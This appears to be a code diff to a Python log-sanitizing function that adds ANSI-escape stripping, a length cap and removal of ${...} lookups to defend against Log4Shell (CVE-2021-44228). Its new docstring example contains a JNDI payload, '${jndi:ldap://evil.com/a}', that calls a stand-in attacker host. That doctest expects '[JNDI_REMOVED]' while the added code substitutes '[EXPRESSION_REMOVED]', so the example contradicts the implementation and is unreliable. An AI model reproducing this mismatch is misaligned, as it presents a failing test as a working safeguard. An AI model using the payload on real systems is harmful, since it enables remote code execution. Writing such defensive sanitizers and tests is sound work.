@@ -1038,18 +1038,23 @@ def mask_ip(ip: str) -> str:
     return "xxx.xxx.xxx.xxx"
 
 
-def sanitize_log_value(value: Any) -> str:
+def sanitize_log_value(value: Any, max_length: int = 10000) -> str:
     """Sanitize a value for safe inclusion in log messages.
 
     Removes or escapes characters that could enable log injection attacks:
     - Newline characters (\\n, \\r) that could forge log entries
     - Control characters that could manipulate terminal output
     - Null bytes that could truncate logs
+    - JNDI injection patterns (${jndi:...})
+    - Log4Shell style lookups (${...})
+    - ANSI escape sequences that could manipulate terminal output
 
-    This function helps prevent CWE-117 (Log Injection) vulnerabilities.
+    This function helps prevent CWE-117 (Log Injection) vulnerabilities
+    and protects against JNDI injection attacks (CVE-2021-44228 / Log4Shell).
 
     Args:
         value: The value to sanitize for logging
+        max_length: Maximum length of the sanitized output (default 10000)
 
     Returns:
         String representation safe for inclusion in log messages
@@ -1061,6 +1066,8 @@ def sanitize_log_value(value: Any) -> str:
         'line1 FAKE_LOG_ENTRY'
         >>> sanitize_log_value(None)
         'None'
+        >>> sanitize_log_value("${jndi:ldap://evil.com/a}")
+        '[JNDI_REMOVED]'
     """
     if value is None:
         return "None"
@@ -1068,14 +1075,30 @@ def sanitize_log_value(value: Any) -> str:
     # Convert to string
     str_value = str(value)
 
+    # Remove ANSI escape sequences FIRST (before control char removal)
+    # Pattern: ESC (0x1b) followed by [ and control codes
+    # Also handles common ANSI escape variations
+    ansi_pattern = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]|\x1b[()]?[0-9A-Za-z]")
+    sanitized = ansi_pattern.sub("", str_value)
+
     # Remove or replace dangerous characters:
     # - Newlines and carriage returns (log injection)
     # - Null bytes (log truncation)
     # - Other control characters (terminal manipulation)
-    sanitized = str_value.replace("\n", " ").replace("\r", " ").replace("\x00", "")
+    sanitized = sanitized.replace("\n", " ").replace("\r", " ").replace("\x00", "")
 
     # Remove other control characters (ASCII 0-31 except tab and space)
     sanitized = "".join(char if ord(char) >= 32 or char == "\t" else " " for char in sanitized)
+
+    # Remove JNDI injection patterns (Log4Shell / CVE-2021-44228)
+    # Patterns: ${jndi:...}, ${lower:...}, ${upper:...}, ${env:...}, etc.
+    # This protects against downstream log parsers that may be vulnerable
+    jndi_pattern = re.compile(r"\$\{[^}]*\}", re.IGNORECASE)
+    sanitized = jndi_pattern.sub("[EXPRESSION_REMOVED]", sanitized)
+
+    # Truncate to max length to prevent memory exhaustion
+    if len(sanitized) > max_length:
+        sanitized = sanitized[:max_length] + "...[truncated]"
 
     return sanitized
 
